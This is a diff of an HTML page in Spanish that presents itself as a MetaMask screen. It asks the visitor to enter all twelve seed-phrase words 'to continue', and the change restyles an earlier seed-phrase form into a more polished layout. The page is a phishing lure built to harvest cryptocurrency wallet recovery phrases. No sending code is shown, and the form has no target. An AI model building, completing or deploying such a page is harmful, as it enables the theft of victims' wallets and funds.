@@ -1,47 +1,61 @@
+<!DOCTYPE html>
 <html>
   <head>
-    <title>Frases Semilla MetaMask</title>
+    <style>
+      .container {
+        display: flex;
+        flex-wrap: wrap;
+        background-color: #1c2331;
+        color: #0c5460;
+        padding: 20px;
+      }
+      
+      .box {
+        width: 25%;
+        padding: 20px;
+        text-align: center;
+      }
+      
+      h3 {
+        font-weight: bold;
+        font-size: 18px;
+        margin-bottom: 20px;
+      }
+      
+      button {
+        padding: 10px 20px;
+        background-color: #0c5460;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+    </style>
   </head>
   <body>
-    <h1>Frases Semilla MetaMask</h1>
-    <form>
-      <label for="seedPhrase1">Frase Semilla 1:</label>
-      <input type="text" id="seedPhrase1" name="seedPhrase1">
-      <br><br>
-      <label for="seedPhrase2">Frase Semilla 2:</label>
-      <input type="text" id="seedPhrase2" name="seedPhrase2">
-      <br><br>
-      <label for="seedPhrase3">Frase Semilla 3:</label>
-      <input type="text" id="seedPhrase3" name="seedPhrase3">
-      <br><br>
-      <label for="seedPhrase4">Frase Semilla 4:</label>
-      <input type="text" id="seedPhrase4" name="seedPhrase4">
-      <br><br>
-      <label for="seedPhrase5">Frase Semilla 5:</label>
-      <input type="text" id="seedPhrase5" name="seedPhrase5">
-      <br><br>
-      <label for="seedPhrase6">Frase Semilla 6:</label>
-      <input type="text" id="seedPhrase6" name="seedPhrase6">
-      <br><br>
-      <label for="seedPhrase7">Frase Semilla 7:</label>
-      <input type="text" id="seedPhrase7" name="seedPhrase7">
-      <br><br>
-      <label for="seedPhrase8">Frase Semilla 8:</label>
-      <input type="text" id="seedPhrase8" name="seedPhrase8">
-      <br><br>
-      <label for="seedPhrase9">Frase Semilla 9:</label>
-      <input type="text" id="seedPhrase9" name="seedPhrase9">
-      <br><br>
-      <label for="seedPhrase10">Frase Semilla 10:</label>
-      <input type="text" id="seedPhrase10" name="seedPhrase10">
-      <br><br>
-      <label for="seedPhrase11">Frase Semilla 11:</label>
-      <input type="text" id="seedPhrase11" name="seedPhrase11">
-      <br><br>
-      <label for="seedPhrase12">Frase Semilla 12:</label>
-      <input type="text" id="seedPhrase12" name="seedPhrase12">
-      <br><br>
-      <input type="submit" value="Enviar">
-    </form>
+    <div class="container">
+      <h3>Coloque su frase secreta para continuar</h3>
+      <div class="box">
+        <input type="text" placeholder="Frase semilla 1"></input><br><br>
+        <input type="text" placeholder="Frase semilla 2"></input><br><br>
+        <input type="text" placeholder="Frase semilla 3"></input><br><br>
+        <input type="text" placeholder="Frase semilla 4"></input>
+      </div>
+      <div class="box">
+        <input type="text" placeholder="Frase semilla 5"></input><br><br>
+        <input type="text" placeholder="Frase semilla 6"></input><br><br>
+        <input type="text" placeholder="Frase semilla 7"></input><br><br>
+        <input type="text" placeholder="Frase semilla 8"></input>
+      </div>
+      <div class="box">
+        <input type="text" placeholder="Frase semilla 9"></input><br><br>
+        <input type="text" placeholder="Frase semilla 10"></input><br><br>
+        <input type="text" placeholder="Frase semilla 11"></input><br><br>
+        <input type="text" placeholder="Frase semilla 12"></input>
+      </div>
+      <div class="box">
+        <button type="submit">Enviar</button>
+      </div>
+    </div>
   </body>
 </html>
